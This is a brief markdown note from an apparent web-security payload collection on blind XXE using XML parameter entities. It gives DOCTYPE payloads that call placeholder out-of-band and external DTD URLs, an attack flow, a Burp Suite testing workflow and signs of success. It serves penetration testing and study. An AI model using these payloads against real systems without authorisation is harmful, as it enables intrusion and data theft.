# Payload 04 – Parameter Entity XXE

## Purpose

Test blind XXE using XML parameter entities.

---

## Basic Parameter Entity

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-OOB-URL">
    %xxe;
]>
```

---

## Parameter Entity Syntax

Normal entity:

```xml
&entity;
```

Parameter entity:

```xml
%entity;
```

Parameter entities are processed within the DTD.

---

## External DTD Variant

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
    %xxe;
]>
```

The external DTD can contain additional entity declarations.

---

## Attack Flow

```text
DOCTYPE
   ↓
Parameter Entity
   ↓
External DTD / Resource
   ↓
Entity Processing
   ↓
OOB Interaction / Error
```

---

## Burp Workflow

```text
Intercept XML request
        ↓
Send to Repeater
        ↓
Define parameter entity
        ↓
Reference parameter entity
        ↓
Send request
        ↓
Monitor result
```

---

## Indicators

Look for:

```text
DNS interaction
HTTP interaction
Parser error
Unexpected response
```

---

## Key Point

Parameter entities are particularly useful when normal XML entity processing does not provide a useful response.